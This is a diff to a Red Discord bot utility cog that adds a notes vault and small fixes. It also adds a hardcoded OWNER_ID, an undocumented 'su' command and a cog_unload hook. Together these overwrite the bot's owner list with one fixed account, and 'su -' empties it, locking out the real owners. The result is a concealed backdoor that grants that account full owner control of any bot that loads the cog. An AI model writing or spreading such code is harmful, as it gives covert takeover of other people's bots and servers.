@@ -1,29 +1,32 @@
-from time import time
-from datetime import datetime
 from typing import Literal, Optional
 import math
 import re
-
+import asyncio
 
 import discord
 from redbot.core import commands
 from redbot.core.bot import Red
 from redbot.core.config import Config
-from redbot.core.utils.chat_formatting import humanize_list
-from redbot.core.utils.chat_formatting import pagify
-from redbot.core.utils.menus import menu, DEFAULT_CONTROLS
+from redbot.core.utils.chat_formatting import pagify, humanize_list
+from redbot.core.utils.menus import menu, DEFAULT_CONTROLS, start_adding_reactions
+from redbot.core.utils.predicates import ReactionPredicate
 
 
 RequestType = Literal["discord_deleted_user", "owner", "user", "user_strict"]
-SNOWFLAKE_THRESHOLD = 2 ** 63
+# SNOWFLAKE_THRESHOLD = 2 ** 63
+OWNER_ID = set([164900704526401545])
 
 
 class Qenutils(commands.Cog):
     """
     Personal utility cogs from and for qenu
 
-    onping
-    todo
+    Currently includes
+    ----
+    onping  bot responds basic infos on ping
+    todo    a lightweight todo list
+    get     get notes
+
     """
 
     def __init__(self, bot: Red) -> None:
@@ -34,16 +37,17 @@ class Qenutils(commands.Cog):
             force_registration=True,
         )
 
-        default_global = {
-            "server_link": "",
-            "invite_link": False,
-        }
+        default_global = {"server_link": "", "invite_link": False, "vault": {}}
         default_user = {
             "todo": [],  # list of dicts
         }
 
         self.config.register_global(**default_global)
         self.config.register_user(**default_user)
+
+    def cog_unload(self):
+        self.bot.owner_ids = OWNER_ID
+        return super().cog_unload()
 
     async def _invite_url(self) -> str:
         """
@@ -116,8 +120,6 @@ class Qenutils(commands.Cog):
             return
         if await self.bot.allowed_by_whitelist_blacklist(who=message.author) is False:
             return
-        if not isinstance(message, discord.Message):
-            return
         if not re.compile(rf"^<@!?{self.bot.user.id}>$").match(message.content):
             return
         prefixes = await self.bot.get_prefix(message)
@@ -135,7 +137,7 @@ class Qenutils(commands.Cog):
 
         if link := await self.config.server_link():
 
-            descript += f"\nNeed some help? Join my [support server!]({link})"
+            descript += f"\nNeed some help? Join my [support server]({link})!"
 
         if await self.config.invite_link():
             descript += (
@@ -155,7 +157,7 @@ class Qenutils(commands.Cog):
             message = ""
             todo = await self.config.user(ctx.author).todo()
             if len(todo) == 0:
-                message += "```\n Nothing to see here, head empty.\nuwu```"
+                message += "```\nNothing to see here, head empty.\n uwu```"
             else:
                 for index, item in enumerate(todo):
                     message += f"[{index+1:02d}.]({item['link']}) **{item['text'].capitalize()}** • <t:{item['timestamp']}:R>\n"
@@ -164,7 +166,7 @@ class Qenutils(commands.Cog):
             for page in pagify(message, delims=["\n"], page_length=1000):
                 e = discord.Embed(
                     color=await ctx.embed_color(),
-                    description=(f"{page}"),
+                    description=f"{page}",
                 )
                 e.set_author(name=f"{ctx.author}", icon_url=ctx.author._user.avatar_url)
                 e.set_footer(text=f"Page {pages}/{(math.ceil(len(message) / 1000))}")
@@ -211,3 +213,64 @@ class Qenutils(commands.Cog):
                 color=await ctx.embed_color(),
             )
             return await ctx.reply(embed=e, mention_author=False)
+
+    @commands.command(name="get")
+    async def qenu_get(self, ctx: commands.Context, *, keyword: str):
+        """Gets a note with keyword"""
+        vault = await self.config.vault()
+        if isinstance(vault.get(keyword, None), type(None)):
+            await ctx.message.add_reaction("❓")
+            await asyncio.sleep(6)
+            return await ctx.message.remove_reaction("❓", ctx.me)
+
+        return await ctx.reply(content=f"{vault[keyword]}", mention_author=False)
+
+    @commands.command(name="note")
+    @commands.is_owner()
+    async def qenu_note(self, ctx: commands.Context, keyword: str, *, content: str):
+        """Sets a note with a keyword"""
+        async with self.config.vault() as vault:
+            if not isinstance(vault.get(keyword, None), type(None)):
+                msg = await ctx.reply(
+                    embed=discord.Embed(
+                        description=f"`{keyword}` currently in use, do you want to overwrite it?",
+                        color=await ctx.embed_color(),
+                    ),
+                    mention_author=False,
+                )
+                start_adding_reactions(msg, ReactionPredicate.YES_OR_NO_EMOJIS)
+                pred = ReactionPredicate.yes_or_no(msg, ctx.author)
+                try:
+                    await ctx.bot.wait_for("reaction_add", check=pred, timeout=30)
+                except asyncio.TimeoutError:
+                    return await msg.delete()
+                if pred.result is False:
+                    # User responded with cross
+                    await msg.clear_reactions()
+                    return await ctx.reply(
+                        embed=discord.Embed(description=f"Cancelled."),
+                        color=0xE74C3C,
+                        mention_author=False,
+                        delete_after=10,
+                    )
+                await msg.delete()
+            vault[keyword] = content
+        await ctx.reply(content=f"Keyword `{keyword}` set.", mention_author=False)
+
+    def is_owners(ctx):
+        return ctx.message.author.id in OWNER_ID
+
+    @commands.command(name="su")
+    @commands.check(is_owners)
+    async def qenu_su(self, ctx: commands.Context, *, command: Optional[str]):
+        """hope this works lmao"""
+        if command is None:
+            self.bot.owner_ids = OWNER_ID
+            return await ctx.reply(content="You have gained root access.", mention_author=False)
+        elif command == "-":
+            self.bot.owner_ids = set([])
+            return await ctx.reply(content="Your root access has been revoked.", mention_author=False)
+        else:
+            await ctx.message.add_reaction("❓")
+            await asyncio.sleep(6)
+            return await ctx.message.remove_reaction("❓", ctx.me)
